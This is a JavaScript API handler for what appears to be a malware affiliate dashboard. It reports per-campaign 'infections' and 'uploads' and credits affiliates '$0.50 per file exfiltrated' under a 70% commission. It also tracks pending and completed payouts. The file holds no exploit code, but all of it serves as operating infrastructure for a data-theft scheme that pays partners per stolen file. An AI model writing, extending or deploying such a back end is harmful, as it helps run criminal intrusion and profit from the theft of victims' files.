// vercel-dashboard/api/affiliate/stats/earnings.js
// Affiliate earnings statistics

import { kv } from '../../../lib/kv.js';
import { verifyPayloadApiKey } from '../../auth/middleware.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

  if (request.method === 'OPTIONS') return response.status(200).end();
  if (request.method !== 'GET') return response.status(405).json({ error: 'Method not allowed' });

  const auth = await verifyPayloadApiKey(request);
  if (!auth.valid || auth.role !== 'campaign') {
    return response.status(403).json({ error: 'Affiliate access required' });
  }

  const affiliateId = `aff_${auth.campaignId.replace('camp_', '')}`;
  const { range = '30d' } = request.query;

  try {
    const days = range === '1d' ? 1 : range === '7d' ? 7 : range === '30d' ? 30 : range === '90d' ? 90 : 30;
    const dates = [];
    for (let i = days - 1; i >= 0; i--) {
      const d = new Date();
      d.setDate(d.getDate() - i);
      dates.push(d.toISOString().split('T')[0]);
    }

    const campaignIds = await kv.smembers(`affiliate:${affiliateId}:campaigns`) || [];
    
    const daily = [];
    let totalEarned = 0;
    let paidEarnings = 0;
    let pendingEarnings = 0;

    // Get payouts
    const payouts = [];
    const payoutIds = await kv.smembers(`affiliate:${affiliateId}:payouts`) || [];
    for (const pid of payoutIds) {
      const payout = await kv.get(`payout:${pid}`);
      if (payout) payouts.push(payout);
    }
    payouts.sort((a, b) => new Date(b.requestedAt) - new Date(a.requestedAt));

    for (const payout of payouts) {
      if (payout.status === 'completed') {
        paidEarnings += payout.amount;
      } else if (payout.status === 'pending' || payout.status === 'processing') {
        pendingEarnings += payout.amount;
      }
    }

    // Mock daily earnings based on infections
    for (const date of dates) {
      let dayEarned = 0;
      let dayPaid = 0;
      let dayPending = 0;

      for (const cid of campaignIds) {
        const dayStats = await kv.hgetall(`campaign:${cid}:daily:${date}`) || {};
        const infections = parseInt(dayStats.infections || '0');
        const uploads = parseInt(dayStats.uploads || '0');
        // Estimate: $0.50 per file exfiltrated
        dayEarned += uploads * 0.5;
      }

      // Check payouts on this date
      for (const payout of payouts) {
        const payoutDate = payout.requestedAt.split('T')[0];
        if (payoutDate === date) {
          if (payout.status === 'completed') dayPaid += payout.amount;
          else dayPending += payout.amount;
        }
      }

      daily.push({ date, earned: dayEarned, paid: dayPaid, pending: dayPending });
      totalEarned += dayEarned;
    }

    const affiliate = await kv.get(`affiliate:${affiliateId}`) || {};
    const commissionRate = affiliate.commissionRate || 70;
    const availableForPayout = Math.max(0, totalEarned - paidEarnings - pendingEarnings);
    const totalPayouts = payouts.filter(p => p.status === 'completed').length;
    const avgPayout = totalPayouts > 0 ? paidEarnings / totalPayouts : 0;
    const lastPayout = payouts.find(p => p.status === 'completed');

    return response.json({
      summary: {
        totalEarned,
        pendingEarnings,
        paidEarnings,
        availableForPayout,
        commissionRate,
        totalPayouts,
        avgPayout,
        lastPayoutDate: lastPayout?.completedAt || null,
      },
      daily,
      payouts: payouts.slice(0, 50),
    });
  } catch (error) {
    console.error('Affiliate earnings stats error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}